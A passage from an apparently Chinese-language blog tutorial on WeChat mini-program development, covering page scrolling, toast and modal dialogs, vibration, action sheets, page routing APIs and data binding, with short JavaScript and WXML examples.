滚动到指定的选择器的位置"></a>0x12 滚动到指定的选择器的位置</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">scrollToTop</span>(<span class="params"></span>) &#123;</span><br><span class="line">  wx.<span class="title function_">pageScrollTo</span>(&#123;</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">3000</span>,</span><br><span class="line">    <span class="attr">selector</span>:<span class="string">&quot;.pagetop&quot;</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"> </span><br><span class="line"><span class="title function_">scrollToPosition</span>(<span class="params"></span>) &#123;</span><br><span class="line">  wx.<span class="title function_">pageScrollTo</span>(&#123;</span><br><span class="line">    <span class="attr">duration</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="attr">selector</span>:<span class="string">&quot;#pageblock&quot;</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="0x13-消息提示框Toast"><a href="#0x13-消息提示框Toast" class="headerlink" title="0x13 消息提示框Toast"></a>0x13 消息提示框Toast</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">bindtap</span>=<span class="string">&quot;toastTap&quot;</span>&gt;</span>点击弹出消息对话框<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">//primary是type的三个有效值之一，它是绿色的</span><br><span class="line">//其余有效值为warn红色，default白色</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">toastTap</span>(<span class="params"></span>) &#123;</span><br><span class="line">   wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">     <span class="attr">title</span>: <span class="string">&#x27;购买成功&#x27;</span>,</span><br><span class="line">     <span class="attr">icon</span>: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">     <span class="attr">duration</span>: <span class="number">2000</span></span><br><span class="line">   &#125;)</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><ul><li>title：为必填，提示的内容</li><li>icon：只有三个选项，success、loading、none(这三个分别适用于不同的场景)</li><li>duration：提示延迟的时间，默认为1500毫秒，也就是1.5秒</li></ul><h2 id="0x14-模态对话框"><a href="#0x14-模态对话框" class="headerlink" title="0x14 模态对话框"></a>0x14 模态对话框</h2><p>Ctrl+&#x2F;为代码注释快捷键</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">bindtap</span>=<span class="string">&quot;modalTap&quot;</span>&gt;</span>显示模态对话框<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">modalTap</span>(<span class="params"></span>) &#123;</span><br><span class="line">   wx.<span class="title function_">showModal</span>(&#123;</span><br><span class="line">     <span class="attr">title</span>: <span class="string">&#x27;学习声明&#x27;</span>,</span><br><span class="line">     <span class="attr">content</span>: <span class="string">&#x27;学习小程序的开发是一件有意思的事情，我决定每天打卡学习&#x27;</span>,</span><br><span class="line">     <span class="attr">showCancel</span>: <span class="literal">true</span>,</span><br><span class="line">     <span class="attr">confirmText</span>: <span class="string">&#x27;确定&#x27;</span>,</span><br><span class="line">     <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">       <span class="keyword">if</span> (res.<span class="property">confirm</span>) &#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用户点击了确定&#x27;</span>)</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.<span class="property">cancel</span>) &#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用户点击了取消&#x27;</span>)</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><p><strong>千变万化之API</strong></p><p>阅读API的技术文档，就要了解该API有哪些属性，属性代表得是什么含义，属性是什么类型（<strong>这一点非常重要</strong>），以及它的默认值是什么，可以有哪些取值。</p><ul><li>title属性不是必填，删除title的赋值，就不会显示标题啦；</li><li>content属性也不是必填，为提示的内容；</li><li>showCancel默认值就是true，意思是默认显示取消按钮，改为false就不显示了</li><li>confirmText默认值为确定，你可以改成别的试试</li></ul><h3 id="0x001-wx-showModal-Object-object"><a href="#0x001-wx-showModal-Object-object" class="headerlink" title="0x001 wx.showModal(Object object)"></a>0x001 wx.showModal(Object object)</h3><p>显示模态对话框</p><h3 id="0x002-参数"><a href="#0x002-参数" class="headerlink" title="0x002 参数"></a>0x002 参数</h3><p><strong>Object object</strong></p><table><thead><tr><th align="left">属性</th><th align="left">类型</th><th align="left">默认值</th><th align="left">必填</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">title</td><td align="left">string</td><td align="left"></td><td align="left">否</td><td align="left">提示的标题</td></tr><tr><td align="left">content</td><td align="left">string</td><td align="left"></td><td align="left">否</td><td align="left">提示的内容</td></tr><tr><td align="left">showCancel</td><td align="left">boolean</td><td align="left">true</td><td align="left">否</td><td align="left">是否显示取消按钮</td></tr><tr><td align="left">cancelText</td><td align="left">string</td><td align="left">‘取消’</td><td align="left">否</td><td align="left">取消按钮的文字，最多 4 个字符</td></tr><tr><td align="left">cancelColor</td><td align="left">string</td><td align="left">#000000</td><td align="left">否</td><td align="left">取消按钮的文字颜色，必须是 16 进制格式的颜色字符串</td></tr><tr><td align="left">confirmText</td><td align="left">string</td><td align="left">‘确定’</td><td align="left">否</td><td align="left">确认按钮的文字，最多 4 个字符</td></tr><tr><td align="left">confirmColor</td><td align="left">string</td><td align="left">#576B95</td><td align="left">否</td><td align="left">确认按钮的文字颜色，必须是 16 进制格式的颜色字符串</td></tr><tr><td align="left">success</td><td align="left">function</td><td align="left"></td><td align="left">否</td><td align="left">接口调用成功的回调函数</td></tr><tr><td align="left">fail</td><td align="left">function</td><td align="left"></td><td align="left">否</td><td align="left">接口调用失败的回调函数</td></tr><tr><td align="left">complete</td><td align="left">function</td><td align="left"></td><td align="left">否</td><td align="left">接口调用结束的回调函数（调用成功、失败都会执行）</td></tr></tbody></table><h3 id="0x003-object-success-回调函数"><a href="#0x003-object-success-回调函数" class="headerlink" title="0x003 object.success 回调函数"></a>0x003 object.success 回调函数</h3><h3 id="0x004-参数"><a href="#0x004-参数" class="headerlink" title="0x004 参数"></a>0x004 参数</h3><p><strong>Object res</strong></p><table><thead><tr><th align="left">属性</th><th align="left">类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">confirm</td><td align="left">boolean</td><td align="left">为 true 时，表示用户点击了确定按钮</td></tr><tr><td align="left">cancel</td><td align="left">boolean</td><td align="left">为 true 时，表示用户点击了取消（用于 Android 系统区分点击蒙层关闭还是点击取消按钮关闭）</td></tr></tbody></table><h2 id="0x15-console-log日志打印"><a href="#0x15-console-log日志打印" class="headerlink" title="0x15 console.log日志打印"></a>0x15 console.log日志打印</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (res.<span class="property">confirm</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用户点击了确定&#x27;</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.<span class="property">cancel</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用户点击了取消&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>res是什么？res.confirm、res.cancel是什么，从哪里来的？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">  <span class="keyword">if</span> (res.<span class="property">confirm</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;点击确认之后的res.confirm是：&quot;</span> + res.<span class="property">confirm</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;点击确认之后的res.cancel是：&quot;</span> + res.<span class="property">cancel</span>)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.<span class="property">cancel</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;用户点击了取消&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;点击取消之后的res.confirm是：&quot;</span> + res.<span class="property">confirm</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;点击取消之后的res.cancel是：&quot;</span> + res.<span class="property">cancel</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x16-手机振动"><a href="#0x16-手机振动" class="headerlink" title="0x16 手机振动"></a>0x16 手机振动</h2><h3 id="0x001-长震动"><a href="#0x001-长震动" class="headerlink" title="0x001 长震动"></a>0x001 长震动</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">bindtap</span>=<span class="string">&quot;vibrateLong&quot;</span>&gt;</span>长振动<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">vibrateLong</span>(<span class="params"></span>) &#123;</span><br><span class="line">  wx.<span class="title function_">vibrateLong</span>(&#123;</span><br><span class="line">    <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">fail</span>(<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">complete</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;振动完成&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="0x002-短震动"><a href="#0x002-短震动" class="headerlink" title="0x002 短震动"></a>0x002 短震动</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">bindtap</span>=<span class="string">&quot;vibrateShort&quot;</span>&gt;</span>短振动<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">vibrateShort</span>(<span class="params"></span>) &#123;</span><br><span class="line">  wx.<span class="title function_">vibrateShort</span>(&#123;</span><br><span class="line">    <span class="title function_">success</span>(<span class="params">res</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">fail</span>(<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(err)</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">complete</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;振动完成&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="0x17-弹出操作菜单"><a href="#0x17-弹出操作菜单" class="headerlink" title="0x17 弹出操作菜单"></a>0x17 弹出操作菜单</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;default&quot;</span> <span class="attr">bindtap</span>=<span class="string">&quot;actionSheetTap&quot;</span>&gt;</span>弹出操作菜单<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">actionSheetTap</span>(<span class="params"></span>) &#123;</span><br><span class="line">  wx.<span class="title function_">showActionSheet</span>(&#123;</span><br><span class="line">    <span class="attr">itemList</span>: [<span class="string">&#x27;添加照片&#x27;</span>, <span class="string">&#x27;删除照片&#x27;</span>, <span class="string">&#x27;更新照片&#x27;</span>, <span class="string">&#x27;查询更多&#x27;</span>],</span><br><span class="line">    <span class="title function_">success</span>(<span class="params">e</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">tapIndex</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><blockquote><p>tapIndex  number  用户点击的按钮序号，从上到下的顺序，从0开始</p></blockquote><h2 id="0x18-页面路由"><a href="#0x18-页面路由" class="headerlink" title="0x18 页面路由"></a>0x18 页面路由</h2><p><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/app-service/route.html">页面路由</a>是一个非常重要的概念，打开新页面、页面返回、Tab页面切换、页面重定向等都是页面路由的不同方式。</p><p>页面路由我们可以简单的理解为对页面链接的管理，根据不同的url链接来显示不同的内容和页面信息</p><h3 id="0x001-Navigator组件与页面路由API"><a href="#0x001-Navigator组件与页面路由API" class="headerlink" title="0x001 Navigator组件与页面路由API"></a>0x001 Navigator组件与页面路由API</h3><p>学习过<a href="https://developers.weixin.qq.com/miniprogram/dev/component/navigator.html">Navigator组件</a>，在navigator组件的技术文档里，我们可以看到open-type属性以及合法值。在小程序API左侧也可以看到5个不同的API。它们之间的对应关系如下:</p><table><thead><tr><th align="center"><strong>页面路由API</strong></th><th><strong>Navigator open-type值</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td align="center"><a href="https://developers.weixin.qq.com/miniprogram/dev/api/route/wx.redirectTo.html">redirectTo</a></td><td>redirect</td><td>关闭当前页面，跳转到应用内的某个页面。但是不允许跳转到 tabbar 页面。</td></tr><tr><td align="center"><a href="https://developers.weixin.qq.com/miniprogram/dev/api/route/wx.navigateTo.html">navigateTo</a></td><td>navigate</td><td>保留当前页面，跳转到应用内的某个页面。但是不能跳到 tabbar 页面。</td></tr><tr><td align="center"><a href="https://developers.weixin.qq.com/miniprogram/dev/api/route/wx.navigateBack.html">navigateBack</a></td><td>navigateBack</td><td>关闭当前页面，返回上一页面或多级页面。</td></tr><tr><td align="center"><a href="https://developers.weixin.qq.com/miniprogram/dev/api/route/wx.switchTab.html">switchTab</a></td><td>switchTab</td><td>跳转到 tabBar 页面，并关闭其他所有非 tabBar 页面</td></tr><tr><td align="center"><a href="https://developers.weixin.qq.com/miniprogram/dev/api/route/wx.reLaunch.html">reLaunch</a></td><td>reLaunch</td><td>关闭所有页面，打开到应用内的某个页面</td></tr></tbody></table><p>也就是说Navigator组件可以做到的事情，既能使用JavaScript调用小程序，也能通过路由API调用小程序。Navigator组件的内容是写死的，而JavaScript则可以提供动态的数据。</p><h3 id="0x002-跳转到新页面与Tab页"><a href="#0x002-跳转到新页面与Tab页" class="headerlink" title="0x002 跳转到新页面与Tab页"></a>0x002 跳转到新页面与Tab页</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">&quot;navigateTo&quot;</span>&gt;</span>保留页面并跳转<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">&quot;switchTab&quot;</span>&gt;</span>跳转到组件Tab页<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">&quot;redirectTo&quot;</span>&gt;</span>关闭当前页面跳转<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">navigateTo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    wx.<span class="title function_">navigateTo</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/pages/home/imgshow/imgshow&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">switchTab</span>(<span class="params"></span>) &#123;</span><br><span class="line">    wx.<span class="title function_">switchTab</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;/pages/list/list&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="title function_">redirectTo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    wx.<span class="title function_">redirectTo</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;/pages/home/imgshow/imgshow&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="0x003-返回上一页"><a href="#0x003-返回上一页" class="headerlink" title="0x003 返回上一页"></a>0x003 返回上一页</h3><p>适用于添加在小程序某个页面中，从而实现页面与页面之间的跳转</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">&quot;navigateBack&quot;</span>&gt;</span>返回上一页<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">navigateBack</span>(<span class="params"></span>) &#123;</span><br><span class="line">    wx.<span class="title function_">navigateBack</span>(&#123;</span><br><span class="line">        <span class="attr">delta</span>: <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="0x19-页面渲染"><a href="#0x19-页面渲染" class="headerlink" title="0x19 页面渲染"></a>0x19 页面渲染</h2><p>介绍如何通过点击组件绑定的事件处理函数来修改data里面的数据，如何把事件处理函数获取到的数据打印到页面。</p><h2 id="0x20-将变量值渲染到页面"><a href="#0x20-将变量值渲染到页面" class="headerlink" title="0x20 将变量值渲染到页面"></a>0x20 将变量值渲染到页面</h2><p>使用开发者工具新建一个页面比如data，然后在data.js的<strong>Page({})函数的前面，也就是不写在Page函数里面，写在data.js的第1行</strong>输入以下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> lesson = <span class="string">&quot;云开发技术训练营&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> enname = <span class="string">&quot;CloudBase Camp&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> x = <span class="number">3</span>, y = <span class="number">4</span>, z = <span class="number">5.001</span>, a = -<span class="number">3</span>, b = -<span class="number">4</span>, c = -<span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> now = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br></pre></td></tr></table></figure><p>然后在data里面添加如下数据（<strong>注意没有双引号，单双引号里的是字符串</strong>）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">charat</span>: lesson.<span class="title function_">charAt</span>(<span class="number">4</span>),</span><br><span class="line">    <span class="attr">concat</span>: enname.<span class="title function_">concat</span>(lesson),</span><br><span class="line">    <span class="attr">uppercase</span>:enname.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">    <span class="attr">abs</span>:<span class="title class_">Math</span>.<span class="title function_">abs</span>(b),</span><br><span class="line">    <span class="attr">pow</span>: <span class="title class_">Math</span>.<span class="title function_">pow</span>(x, y),</span><br><span class="line">    <span class="attr">sign</span>:<span class="title class_">Math</span>.<span class="title function_">sign</span>(a),</span><br><span class="line">    <span class="attr">now</span>:now,<span class="comment">//也可以使用toSpring()方法</span></span><br><span class="line">           <span class="comment">//now:now.toString(),</span></span><br><span class="line">    <span class="attr">fullyear</span>:now.<span class="title function_">getFullYear</span>(),</span><br><span class="line">    <span class="attr">date</span>:now.<span class="title function_">getDate</span>(),</span><br><span class="line">    <span class="attr">day</span>: now.<span class="title function_">getDay</span>(),</span><br><span class="line">    <span class="attr">hours</span>: now.<span class="title function_">getHours</span>(),</span><br><span class="line">    <span class="attr">minutes</span>: now.<span class="title function_">getMinutes</span>(),</span><br><span class="line">    <span class="attr">seconds</span>: now.<span class="title function_">getSeconds</span>(),</span><br><span class="line">    <span class="attr">time</span>: now.<span class="title function_">getTime</span>()</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>在data.wxml里输入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&quot;云开发技术训练营&quot;第5个字符 &#123;&#123;charat&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>两个字符串连接后的结果：&#123;&#123;concat&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>CloudBase Camp字母大写：&#123;&#123;uppercase&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>b的绝对值：&#123;&#123;abs&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>x的y次幂：&#123;&#123;pow&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>返回a是正还是负：&#123;&#123;sign&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>now对象：&#123;&#123;now&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;fullyear&#125;&#125;年<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;date&#125;&#125;日<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>星期&#123;&#123;day&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;hours&#125;&#125;时<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;minutes&#125;&#125;分<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;seconds&#125;&#125;秒<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>1970年1月1日至今的毫秒数：&#123;&#123;time&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x21-响应的数据绑定"><a href="#0x21-响应的数据绑定" class="headerlink" title="0x21 响应的数据绑定"></a>0x21 响应的数据绑定</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">style</span>=<span class="string">&quot;background-color:&#123;&#123;bgcolor&#125;&#125;;width:400rpx;height:300rpx;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">&quot;redTap&quot;</span>&gt;</span>让背景变红<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">bindtap</span>=<span class="string">&quot;yellowTap&quot;</span>&gt;</span>让背景变黄<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">redTap</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">        <span class="attr">bgcolor</span>: <span class="string">&quot;#cd584a&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">yellowTap</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span 